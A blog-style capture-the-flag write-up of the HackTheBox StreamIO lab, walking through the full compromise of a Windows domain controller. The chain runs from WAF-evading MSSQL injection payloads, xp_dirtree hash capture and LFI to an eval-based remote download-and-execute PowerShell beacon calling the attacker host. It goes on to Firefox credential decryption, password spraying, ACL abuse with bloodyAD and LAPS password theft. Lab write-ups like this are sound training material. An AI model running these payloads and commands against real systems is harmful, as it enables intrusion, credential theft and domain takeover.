---
title: HackTheBox - StreamIO
date: 2025-07-22 02:30:00 +/-TTTT
categories: [boxes, red-teaming]
tags: [Sqli, Firefox Decyrpt, WriteOwner, Laps]     # TAG names should always be lowercase
image : assets/images/21240942d301a96e80574353a96b9003.webp
---

Lets start with nmap scan

### nmap

```bash
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-07-15 05:12:35Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http      syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

and here we got web server on port **443** → `watch.streamIO.htb` and its redirect us here.

since we have smb here i extract domain and DC name 

```bash
➜  streamio nxc smb 10.10.11.158
SMB         10.10.11.158    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
```

and here

```bash
➜  streamio cat /etc/hosts 
[SNIP]
10.10.11.58     watch.streamIO.htb streamIO.htb DC.streamIO.htb
```

okey lets take a look at website.

### Web Server

![alt text](../assets/images/streamio1.png)


nmap show us → watch.streamio.htb but we can also learn with since its **HTTPS let me show u.**

![alt text](../assets/images/streamio2.png)

Lets check there if something interesting there also

![alt text](../assets/images/streamio3.png)

okey its potentally XSS tbh but im not sure tho. i will check which extension Website using for files. and it was 

```python
https://watch.streamio.htb/index.php
```

so lets fuzzing for php extension on `watch.streamio.htb` 

```python
➜  streamio gobuster dir -u https://watch.streamio.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://watch.streamio.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/search.php           (Status: 200) [Size: 253887]
/static               (Status: 301) [Size: 157] [--> https://watch.streamio.htb/static/]
/index.php            (Status: 200) [Size: 2829]
```

/search.php → seems like interesting isnt it huh?

### SQLinjection

![alt text](../assets/images/streamio4.png)

okey this look like really suspicious for SQLi attack tbh. lets move on Burp Suite and anaylze the request

![alt text](../assets/images/streamio5.png)

okey lets start sqlmap and look for manually.

```python
➜  streamio cat search_req 
POST /search.php HTTP/2
Host: watch.streamio.htb
Content-Length: 3
Cache-Control: max-age=0
Sec-Ch-Ua: "Not.A/Brand";v="99", "Chromium";v="136"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: https://watch.streamio.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://watch.streamio.htb/search.php
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

q=*
```

and start with

```python
sqlmap -r search_req --level 5 --risk 3 --force-ssl --batch
```

`--force-ssl`  → for WAF and Firewall

`--batch` → for skip question part.

But i woould love to analyze it with Manually for sure. For example lets try simple things.

When i try

```python
' OR 1=1--
```

![alt text](../assets/images/streamio6.png)

it says malicious activity so we just sure its about SQLi and we have to modify our payload a bit.

![alt text](../assets/images/streamio7.png)

it didnt getting flagged but we also didnt get it something lets add `+` at last part of payload and lets see.

![alt text](../assets/images/streamio8.png)

okey we found the way but i dont wanna continue with it cause sometimes it wont work so my payload will be 

```python
1024' uNiOn SeLeCt 1,2,3,4,5,6;-- -
```

now we can change **SECOND** value for grab information.

![alt text](../assets/images/streamio9.png)

this is how we verify step by step tho.

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL Injection/MySQL Injection.md#unc-path---ntlm-hash-stealing](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#unc-path---ntlm-hash-stealing)

![alt text](../assets/images/streamio10.png)

i found this and i thougt could be interesting and tried that paylaod

```python
1024'; use master; exec xp_dirtree '\\10.10.14.10\share';-- -
```

![alt text](../assets/images/streamio11.png)

but it cant be crackable no its impossible.

https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet

we will use that one and enumerate manually.

```python
1024' uNiOn SeLeCt 1,name,3,4,5,6 FROM master..sysdatabases;-- -
```

![alt text](../assets/images/streamio12.png)

nice i will check columns with

```python
1024' UNION SELECT 1,column_name,3,4,5,6 FROM information_schema.columns WHERE table_name='users';-- -
```

![alt text](../assets/images/streamio13.png)

thats how i extract usernames

```python
1024' UNION SELECT 1,username,3,4,5,is_staff FROM users;-- -
```

![alt text](../assets/images/streamio14.png)

and we can do same thing for `password`

```python
1024' UNION SELECT 1,password,3,4,5,is_staff FROM users;-- -
```

![alt text](../assets/images/streamio15.png)

nice we got hashes lets check which ones are crackable

```python
➜  streamio cat results.txt 
0049ac57646627b8d7aeaccf8b6a936f        Unknown Not found.
08344b85b329d7efd611b7a7743e8a09        md5     ##123a8j8w5123##
083ffae904143c4796e464dac33c1f7d        Unknown Not found.
0cfaaaafb559f081df2befbe66686de0        Unknown Not found.
1c2b3d8270321140e5153f6637d3ee53        Unknown Not found.
22ee218331afd081b0dcd8115284bae3        Unknown Not found.
2a4e2cf22dd8fcb45adcb91be1e22ae8        md5     $monique$1991$
35394484d89fcfdb3c5e447fe749d213        Unknown Not found.
3577c47eb1e12c8ba021611e1280753c        md5     highschoolmusical
384463526d288edcc95fc3701e523bc7        Unknown Not found.
3961548825e3e21df5646cafe11c6c76        Unknown Not found.
54c88b2dbd7b1a84012fabc1a4c73415        md5     $hadoW
665a50ac9eaa781e4f7f04199db97a11        md5     paddpadd
6dcd87740abb64edfa36d170f0d5450d        md5     $3xybitch
7df45a9e3de3863807c026ba48e55fb3        Unknown Not found.
8097cedd612cc37c29db152b6e9edbd3        Unknown Not found.
925e5408ecb67aea449373d668b7359e        Unknown Not found.
b22abb47a02b52d5dfa27fb0b534f693        md5     !5psycho8!
b779ba15cedfd22a023c4d8bcf5f2332        md5     66boysandgirls..
b83439b16f844bd6ffe35c02fe21b3c0        md5     !?Love?!123
bf55e15b119860a6e6b5a164377da719        Unknown Not found.
c660060492d9edcaa8332d89c99c9239        Unknown Not found.
d62be0dc82071bccc1322d64ec5b6c51        Unknown Not found.
dc332fb5576e9631c9dae83f194f8e70        Unknown Not found.
ec33265e5fc8c2f1b0c137bb7b3632b5        Unknown Not found.
ee0b8a0937abd60c2882eacb2f8dc49f        md5     physics69i
ef8f3d30a856cf166fb8215aca93e9ff        md5     %$clara
f03b910e2bd0313a23fdd7575f34a694        Unknown Not found.
f87d3c0d6c8fd686aacc6627f1f493a5        md5     !!sabrina$
fd78db29173a5cf701bd69027cb9bf6b        Unknown Not found.
```

here is results and i save them with.

```python
➜  streamio cat results.txt | awk '{print $3}' | cut -d 'N' -f1 | sed '/^\s*$/d' > passwords.txt

➜  streamio cat passwords.txt 
##123a8j8w5123##
$monique$1991$
highschoolmusical
$hadoW
paddpadd
$3xybitch
!5psycho8!
66boysandgirls..
!?Love?!123
physics69i
%$clara
!!sabrina$
```

lets grab usernames and check them with `/home/elliot/tools/kerbrute_linux_amd64` first for which ones exist.

```python
➜  streamio /home/elliot/tools/kerbrute_linux_amd64 userenum -d streamIO.htb --dc DC.streamIO.htb usernames.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 07/21/25 - Ronnie Flathers @ropnop

2025/07/21 22:16:49 >  Using KDC(s):
2025/07/21 22:16:49 >   DC.streamIO.htb:88

2025/07/21 22:16:49 >  [+] VALID USERNAME:       yoshihide@streamIO.htb
```

as u can see only `yoshihide` exist and now we can start brute force at with nxc.

```python
➜  streamio nxc smb 10.10.11.158 -u 'yoshihide' -p passwords.txt --continue-on-success --no-bruteforce
SMB         10.10.11.158    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
[22:18:39] ERROR    Number provided of usernames and passwords/hashes do not match! 
```

### Access Admin Dashboard

okey i think this usernames and password for website login page. [`https://streamio.htb/login.php`](https://streamio.htb/login.php)

![alt text](../assets/images/streamio16.png)

and i will start brute force attack only for yoshihide

![alt text](../assets/images/streamio17.png)

and we got it 

![alt text](../assets/images/streamio18.png)

`66boysandgirls..`

and we are in [`https://streamio.htb/admin/`](https://streamio.htb/admin/)

![alt text](../assets/images/streamio19.png)

okey those are seems like interesting i will start fuzzing i think.

```python
ffuf -u 'https://streamio.htb/admin/?FUZZ=' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -b "PHPSESSID=dn5v06pm569oo5c9b37uqc1mhv" -t 50 -v  -fs 1678
```

![alt text](../assets/images/streamio20.png)

okey thats interesting debug is not exist we got before right?? so lets try `LFI` here tho.

![alt text](../assets/images/streamio21.png)

nice!!!! btw we can grab NTLM hash with it.

![alt text](../assets/images/streamio22.png)

but its not crackable. but it was interesting

```python
https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php
```

```python
WYoaXNzZXQoJF9QT1NUWydzdGFmZl9pZCddKSkNCnsNCj8+DQo8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1zdWNjZXNzIj4gTWVzc2FnZSBzZW50IHRvIGFkbWluaXN0cmF0b3I8L2Rpdj4NCjw/cGhwDQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDEiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ic3RhZmZfaWQiIHZhbHVlPSI8P3BocCBlY2hvICRyb3dbJ2lkJ107ID8+Ij4NCgkJCQk8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1zbSBidG4tcHJpbWFyeSIgdmFsdWU9IkRlbGV0ZSI+DQoJCQk8L2Zvcm0+DQoJCTwvZGl2Pg0KCTwvZGl2Pg0KPC9kaXY+DQo8P3BocA0KfSAjIHdoaWxlIGVuZA0KPz4NCjxicj48aHI+PGJyPg0KPGgxPlVzZXIgbWFuYWdtZW50PC9oMT4NCjw/cGhwDQppZighZGVmaW5lZCgnaW5jbHVkZWQnKSkNCglkaWUoIk9ubHkgYWNjZXNzYWJsZSB0aHJvdWdoIGluY2x1ZGVzIik7DQppZihpc3NldCgkX1BPU1RbJ3VzZXJfaWQnXSkpDQp7DQokcXVlcnkgPSAiZGVsZXRlIGZyb20gdXNlcnMgd2hlcmUgaXNfc3RhZmYgPSAwIGFuZCBpZCA9ICIuJF9QT1NUWyd1c2VyX2lkJ107DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idXNlcl9pZCIgdmFsdWU9Ijw/cGhwIGVjaG8gJHJvd1snaWQnXTsgPz4iPg0KCQkJCTxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXNtIGJ0bi1wcmltYXJ5IiB2YWx1ZT0iRGVsZXRlIj4NCgkJCTwvZm9ybT4NCgkJPC9kaXY+DQoJPC9kaXY+DQo8L2Rpdj4NCjw/cGhwDQp9ICMgd2hpbGUgZW5kDQo/Pg0KPGJyPjxocj48YnI+DQo8Zm9ybSBtZXRob2Q9IlBPU1QiPg0KPGlucHV0IG5hbWU9ImluY2x1ZGUiIGhpZGRlbj4NCjwvZm9ybT4NCjw/cGhwDQppZihpc3NldCgkX1BPU1RbJ2luY2x1ZGUnXSkpDQp7DQppZigkX1BPU1RbJ2luY2x1ZGUnXSAhPT0gImluZGV4LnBocCIgKSANCmV2YWwoZmlsZV9nZXRfY29udGVudHMoJF9QT1NUWydpbmNsdWRlJ10pKTsNCmVsc2UNCmVjaG8oIiAtLS0tIEVSUk9SIC0tLS0gIik7DQp9DQo/Pg== " | base64 -d
�yr<h1>Movie managment</h1>
<?php
if(!defined('included'))
        die("Only accessable through includes");
if(isset($_POST['movie_id']))
{
$query = "delete from movies where id = ".$_POST['movie_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from movies order by movie";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
        <div class="form-control" style="height: 3rem;">
                <h4 style="float:left;"><?php echo $row['movie']; ?></h4>
                <div style="float:right;padding-right: 25px;">
                        <form method="POST" action="?movie=">
                                <input type="hidden" name="movie_id" value="<?php echo $row['id']; ?>">
                                <input type="submit" class="btn btn-sm btn-primary" value="Delete">
                        </form>
                </div>
        </div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>Staff managment</h1>
<?php
if(!defined('included'))
        die("Only accessable through includes");
$query = "select * from users where is_staff = 1 ";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
if(isset($_POST['staff_id']))
{
?>
<div class="alert alert-success"> Message sent to administrator</div>
<?php
}
$query = "select * from users where is_staff = 1";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
        <div class="form-control" style="height: 3rem;">
                <h4 style="float:left;"><?php echo $row['username']; ?></h4>
                <div style="float:right;padding-right: 25px;">
                        <form method="POST">
                                <input type="hidden" name="staff_id" value="<?php echo $row['id']; ?>">
                                <input type="submit" class="btn btn-sm btn-primary" value="Delete">
                        </form>
                </div>
        </div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>User managment</h1>
<?php
if(!defined('included'))
        die("Only accessable through includes");
if(isset($_POST['user_id']))
{
$query = "delete from users where is_staff = 0 and id = ".$_POST['user_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from users where is_staff = 0";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
        <div class="form-control" style="height: 3rem;">
                <h4 style="float:left;"><?php echo $row['username']; ?></h4>
                <div style="float:right;padding-right: 25px;">
                        <form method="POST">
                                <input type="hidden" name="user_id" value="<?php echo $row['id']; ?>">
                                <input type="submit" class="btn btn-sm btn-primary" value="Delete">
                        </form>
                </div>
        </div>
</div>
<?php
} # while end
?>
<br><hr><br>
<form method="POST">
<input name="include" hidden>
</form>
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>base64: invalid input
```

### First Beacon / reverse shell

okey!!!!! `include` seems like interesting enough lets bring it Burp Suite and analyze more.

```python
➜  streamio cat a.php 
system("dir C:\\");
➜  streamio python3 -m http.server 80
```

i will try something like that.

![alt text](../assets/images/streamio23.png)

lets try to grab beacon.

```python
➜  streamio cat shell.ps1 
iwr -usebasicparsing -uri http://10.10.14.10/a.ps1|iex
➜  streamio cat shell.ps1 | iconv -t UTF-16LE | base64 -w0
aQB3AHIAIAAtAHUAcwBlAGIAYQBzAGkAYwBwAGEAcgBzAGkAbgBnACAALQB1AHIAaQAgAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQAwAC8AYQAuAHAAcwAxAHwAaQBlAHgACgA
```

and

```python
➜  streamio cat a.php
system("powershell -enc aQB3AHIAIAAtAHUAcwBlAGIAYQBzAGkAYwBwAGEAcgBzAGkAbgBnACAALQB1AHIAaQAgAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQAwAC8AYQAuAHAAcwAxAHwAaQBlAHgACgA=");
```

and we got it.!!!

![alt text](../assets/images/streamio24.png)

nice!!!!! we were have web server right???? so i will look if any different usernames or paassword around

```python
powerpick type C:\inetpub\streamio.htb\register.php
```

and i found really interesting things here.

![alt text](../assets/images/streamio25.png)

its seems like MSSQL creds but 1433 open???

### MSSQL

```python
➜  streamio nmap -p 1433 streamio.htb 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-21 23:23 EDT
Nmap scan report for streamio.htb (10.10.11.158)
Host is up (0.16s latency).
rDNS record for 10.10.11.158: DC.streamIO.htb

PORT     STATE    SERVICE
1433/tcp filtered ms-sql-s
```

no its not lets check if its on machine then we can use proxy and access mssql succesfully.

```python
[07/21 23:24:28] beacon> shell netstat -ano | findstr "1433"
[07/21 23:24:28] [*] Tasked beacon to run: netstat -ano | findstr "1433"
[07/21 23:24:28] [+] host called home, sent: 60 bytes
[07/21 23:24:29] [+] received output:
  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       3612
  TCP    [::]:1433              [::]:0                 LISTENING       3612
  UDP    [::]:61433             *:*                                    2840
```

its there!!!! lets put proxy and access with mssqlclient

```python
proxychains -q nxc mssql streamio.htb -u db_admin -p 'B1@hx31234567890' --local-auth
```

![alt text](../assets/images/streamio26.png)

Lets connnect!!!!

```python
proxychains -q mssqlclient.py db_admin@streamio.htb              
```

![alt text](../assets/images/streamio27.png)

off course i tried enable xp_cmdshell but it didnt work so lets enum manually again pffff xD.

https://hacktricks.boitatech.com.br/pentesting/pentesting-mssql-microsoft-sql-server

and yeah `xp_dirtree \\10.10.14.10\share` → give us DC hash aagain.

WE READ STREAMIO DATABASE BEFORE SO LETS READ STREAMIO.BACKUP NOW!!!

```python
SQL (db_admin  db_admin@master)> SELECT name FROM master.dbo.sysdatabases
name              
---------------   
master            

tempdb            

model             

msdb              

STREAMIO          

streamio_backup   

SQL (db_admin  db_admin@master)> SELECT * FROM streamio_backup.INFORMATION_SCHEMA.TABLES;
TABLE_CATALOG     TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE   
---------------   ------------   ----------   ----------   
streamio_backup   dbo            movies       b'BASE TABLE'   

streamio_backup   dbo            users        b'BASE TABLE'   
SQL (db_admin  db_admin@master)> SELECT * FROM streamio_backup.dbo.users;

id   username                                             password                                             
--   --------------------------------------------------   --------------------------------------------------   
 1   nikk37                                               389d14cb8e4e9b94b137deb1caf0612a                     

 2   yoshihide                                            b779ba15cedfd22a023c4d8bcf5f2332                     

 3   James                                                c660060492d9edcaa8332d89c99c9239                     

 4   Theodore                                             925e5408ecb67aea449373d668b7359e                     

 5   Samantha                                             083ffae904143c4796e464dac33c1f7d                     

 6   Lauren                                               08344b85b329d7efd611b7a7743e8a09                     

 7   William                                              d62be0dc82071bccc1322d64ec5b6c51                     

 8   Sabrina                                              f87d3c0d6c8fd686aacc6627f1f493a5 
```

we dont need to try to crack them all cause.

![alt text](../assets/images/streamio28.png)

we only need `nikk37`

### nikk37

![alt text](../assets/images/streamio29.png)

okey we got new password lets try on nxc now!!!

```python
➜  streamio nxc smb 10.10.11.158 -u 'nikk37' -p 'get_dem_girls2@yahoo.com'                 
SMB         10.10.11.158    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.158    445    DC               [+] streamIO.htb\nikk37:get_dem_girls2@yahoo.com 

```

nice lets check `--users` 

![alt text](../assets/images/streamio30.png)

lets see if we can dump BH data.

```python
➜  streamio nxc ldap 10.10.11.158 -u 'nikk37' -p 'get_dem_girls2@yahoo.com'    
LDAP        10.10.11.158    389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:streamIO.htb)
LDAP        10.10.11.158    389    DC               [+] streamIO.htb\nikk37:get_dem_girls2@yahoo.com 
➜  streamio nxc ldap DC.streamIO.htb -u 'nikk37' -p 'get_dem_girls2@yahoo.com' --bloodhound --dns-server 10.10.11.158 --collection All
LDAP        10.10.11.158    389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:streamIO.htb)
LDAP        10.10.11.158    389    DC               [+] streamIO.htb\nikk37:get_dem_girls2@yahoo.com 
LDAP        10.10.11.158    389    DC               Resolved collection methods: dcom, objectprops, psremote, group, trusts, rdp, acl, localadmin, container, session
LDAP        10.10.11.158    389    DC               Done in 00M 37S
LDAP        10.10.11.158    389    DC               Compressing output into /home/elliot/.nxc/logs/DC_10.10.11.158_2025-07-21_233836_bloodhound.zip
```

nice!!!! lets upload and analyze it.

![alt text](../assets/images/streamio31.png)

its seems like we got user.txt!!!!!!!!!!!!! lets connect winrm and load beacon again!!!

```python
➜  streamio evil-winrm -i DC.streamIO.htb -u 'nikk37' -p 'get_dem_girls2@yahoo.com'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\nikk37\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\nikk37\Desktop> type user.txt
d41d873aa5755c9850b0b7f34d1f09f6
```

nice!!!! lets load beacon. btw u can use my loader cause thats cool

https://github.com/lineeralgebra/shellcoderunner

```python
➜  shellcoderunner git:(main) ✗ python3 xor.py a.bin mysecretkey --compile
```

```python
*Evil-WinRM* PS C:\ProgramData> upload runner.exe
                                        
Info: Uploading /home/elliot/Documents/HackTheBox/streamio/runner.exe to C:\ProgramData\runner.exe
                                        
Data: 3553440 bytes of 3553440 bytes copied
                                        
Info: Upload successful!
```

### Firefox Decyrpt

FIRSTLY WE WERE ON WEB SERVER SECOND THING I WILL CHECK CHROME OR FIREFOX DECYRPT OFF COURSE.

https://github.com/lclevy/firepwd

![alt text](../assets/images/streamio32.png)

This 2 file all we need it lets check if we have it.

```python
dir C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release\logins.json
dir C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release\key*.db
```

![alt text](../assets/images/streamio33.png)

and BAMM!!!! lets download them and decyrpt!!!

```python
python3 firepwd.py
[SNIP]
decrypting login/password pairs
https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12
```

### JDgodd

nice!!!! lets do password spray tho.

```python
➜  streamio nxc smb 10.10.11.158 -u users.txt -p 'JDg0dd1s@d0p3cr3@t0r' --continue-on-success 
SMB         10.10.11.158    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.158    445    DC               [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r
```

nice its work lets see if its interesting user.

![alt text](../assets/images/streamio34.png)

andddd!!!

![alt text](../assets/images/streamio35.png)

thats our attack aim thooo

![alt text](../assets/images/streamio36.png)

lets do WriteOwner and lets seee!!!

### WriteOwner

We can add ourself at group and use LAPS privileges for DC!!!

![alt text](../assets/images/streamio37.png)

we have to dacledit first cause for full access then we can add ourself.

I Will do all off them with bloodyAD.

Lets start with WriteOwner.

```python
bloodyAD --host DC.streamIO.htb -d streamIO.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' set owner 'Core Staff' JDgodd
[!] S-1-5-21-1470860369-1569627196-4264678630-1104 is already the owner, no modification will be made
bloodyAD --host DC.streamIO.htb -d streamIO.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' add groupMember "Core Staff" JDgodd
```

![alt text](../assets/images/streamio38.png)

okey the reason is WE HAVE NO FULL PRIVLEGES ON THIS GROUP YET SO LETS DOO THIS !!!!

```python
bloodyAD --host DC.streamIO.htb -d streamIO.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' add genericAll "Core Staff" JDgodd
[+] JDgodd has now GenericAll on Core Staff
bloodyAD --host DC.streamIO.htb -d streamIO.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' add groupMember "Core Staff" JDgodd
[+] JDgodd added to Core Staff

```

bammmm!!! now we can do `LAPS` with nxc directly!!!

### LAPS

```python
➜  streamio nxc ldap DC.streamIO.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' -M laps
LDAP        10.10.11.158    389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:streamIO.htb)
LDAP        10.10.11.158    389    DC               [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r 
LAPS        10.10.11.158    389    DC               [*] Getting LAPS Passwords
LAPS        10.10.11.158    389    DC               Computer:DC$ User:                Password:5buA-U4};dJ)h{

```

and 

```python
➜  streamio evil-winrm -i DC.streamIO.htb -u Administrator -p '5buA-U4};dJ)h{'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

### LAPS with Cobalt Strike.

Command to execute as Jddog

```python
ls C:\Program Files\LAPS\CSE
```

![alt text](../assets/images/streamio39.png)

Check for, Computer Object having `ms-Mcs-AdmPwdExpirationTime` attribute is set to Not Null.

Commands to execute;

```python
powershell-import /home/elliot/tools/PowerView.ps1
powerpick Get-DomainComputer | ? { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null } | select dnsHostName
```

![alt text](../assets/images/streamio40.png)

Now lets get Admin Password Command to execute

```python
